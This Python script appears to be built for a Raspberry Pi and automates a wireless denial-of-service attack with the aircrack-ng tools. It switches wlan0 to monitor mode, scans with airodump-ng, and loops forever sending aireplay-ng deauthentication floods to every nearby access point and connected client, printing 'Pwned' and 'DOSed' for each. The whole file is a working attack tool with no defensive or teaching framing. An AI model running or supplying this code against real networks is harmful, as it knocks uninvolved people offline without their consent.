import os
import csv
import time
import subprocess
import sys
gpio = '1'
try:
  import RPi.GPIO as GPIO
  gpio = '1'
except:
  gpio = '0'
if gpio == '1':
    r = 26
    g = 6
    b = 5
    GPIO.setmode(GPIO.BCM)
    GPIO.setwarnings(False)
    GPIO.setup(r, GPIO.OUT)
    GPIO.setup(g, GPIO.OUT)
    GPIO.setup(b, GPIO.OUT)
def blink(re, gr, bl, d):
	if gpio == '1':
	    GPIO.output(r, not(re))
	    GPIO.output(g, not(gr))
	    GPIO.output(b, not(bl))
	    time.sleep(d)
	    GPIO.output(r, True)
	    GPIO.output(g, True)
	    GPIO.output(b, True)
blink(True, False, False, 0.4)
blink(False, True, False, 0.4)
blink(False, False, True, 0.4)
os.system("sudo airmon-ng check kill")
os.system("sudo ifconfig wlan0 down")
os.system("sudo iwconfig wlan0 mode monitor")
def scan(channel, duration):
	execute = []
	execute.append("airodump-ng")
	execute.append("-w")
	execute.append("clients")
	os.system('rm clients-01.csv;rm clients-01.cap;rm clients-01.kismet.netxml;rm clients-01.kismet.csv')
	if int(channel) > 0:
		execute.append("-c")
		execute.append(channel)
	execute.append("wlan0")
	proc = subprocess.Popen(execute, shell=False)
	for t in range(0, duration):
		blink(False, False, True, 0.1)
		time.sleep(0.9)
	subprocess.call(["kill", "-9", "%d" % proc.pid])
	proc.wait()
def outclient(out):
	print "Pwned " + out
	blink(True, False, False, 0.25)
	time.sleep(0.4)
def outAP(out):
	print "DOSed " + out
	blink(True, True, True, 0.25)
	time.sleep(0.4)
def analyse(clientmacs, apmacs, chann, bssids):
	if gpio == '1':
	    GPIO.output(g, False)
	here = False
	with open('clients-01.csv') as csvfile:
		for row in csv.reader(csvfile):
			try:
				apbssids = row[0].strip('{} "')
				apclientmac = row[5].strip('{} "')
				if here == False and apbssids != "BSSID" and apbssids != "Station MAC":
					bssids.append(apbssids)
					chann.append(row[3].strip('{} "'))
				if here == True and apclientmac != "(not associated)":
					clientmacs.append(apbssids)
					apmacs.append(apclientmac)
				if apbssids == "Station MAC":
					here = True
			except:
				pass
	if gpio == '1':
	    GPIO.output(g, True)
while 2 == 2:
	scan(0, 18)
	clientmacs = []
	apmacs = []
	chann = []
	bssids = []
	analyse(clientmacs, apmacs, chann, bssids)
	mostap = ""
	comn = 0
	mostch = "-1"
	for ap in bssids:
		count = 0
		for apmac in apmacs:
			if apmac == ap:
				count = count + 1
		if count > comn:
			comn = count
			mostap = ap
	for x in range(0, len(bssids)):
		if bssids[x] == mostap:
			mostch = chann[x]
	scan(mostch, 25)
	del clientmacs[:]
	del apmacs[:]
	del bssids[:]
	del chann[:]
	analyse(clientmacs, apmacs, chann, bssids)
	print "Found " + str(len(clientmacs)) + " Clients, " + str(len(bssids)) + " APs"
	for vicap in bssids:
		os.system('screen -d -m aireplay-ng --deauth 100 -a ' + vicap + ' wlan0')
		outAP(vicap)
	for x in range(0, len(clientmacs) - 1):
		os.system('screen -d -m aireplay-ng --deauth 100 -a ' + apmacs[x] + ' -c ' + clientmacs[x] + ' wlan0')
		outclient(clientmacs[x])
	os.system('aireplay-ng --deauth 100 -a ' + apmacs[len(clientmacs) - 1] + ' -c ' + clientmacs[len(clientmacs) - 1] + ' wlan0')
	outclient(clientmacs[len(clientmacs) - 1])
